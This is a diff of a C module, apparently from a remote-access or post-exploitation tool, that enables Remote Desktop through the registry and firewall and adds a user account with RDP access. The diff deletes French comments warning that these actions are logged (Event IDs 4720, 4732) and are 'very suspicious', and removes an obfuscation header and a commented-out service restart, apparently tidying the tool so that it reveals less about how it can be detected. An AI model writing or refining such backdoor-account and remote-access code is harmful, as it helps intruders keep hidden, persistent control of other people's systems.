@@ -1,19 +1,8 @@
 #include "rdp.h"
-#include "obfuscation.h"
 #include <stdio.h>
 #include <string.h>
 
-/**
- * Module RDP - Implémentation
- *
- * NOTES DE SÉCURITÉ:
- * - Ces actions nécessitent privilèges admin
- * - Toutes les actions sont loggées dans Windows Event Viewer (Event ID 4720, 4732, etc.)
- * - La création d'utilisateur est TRÈS suspecte
- * - Utilisation de l'obfuscation pour strings sensibles
- */
-
-// Registry path pour RDP (obfusqué plus tard si nécessaire)
+/* Registry key controlling RDP access */
 #define RDP_REG_PATH "SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
 #define RDP_REG_VALUE "fDenyTSConnections"
 
@@ -76,11 +65,6 @@ int rdp_enable(char *output, size_t size) {
         strncat(output, "[-] Firewall: Failed (may already exist)\n", size - strlen(output) - 1);
         ret_code = RDP_ERROR_FIREWALL;
     }
-
-    // 3. Redémarrer le service TermService (optionnel)
-    // Décommenter si nécessaire:
-    // system("net stop TermService /y >nul 2>&1");
-    // system("net start TermService >nul 2>&1");
 
     strncat(output, "[*] RDP is now enabled on port 3389\n", size - strlen(output) - 1);
 
@@ -199,10 +183,6 @@ int rdp_status(char *output, size_t size) {
 
 /**
  * Crée un utilisateur avec accès RDP
- *
- * ATTENTION: TRÈS SUSPECT
- * - Event ID 4720: A user account was created
- * - Event ID 4732: A member was added to a security-enabled local group
  */
 int rdp_adduser(const char *username, const char *password, char *output, size_t size) {
     char cmd[1024];
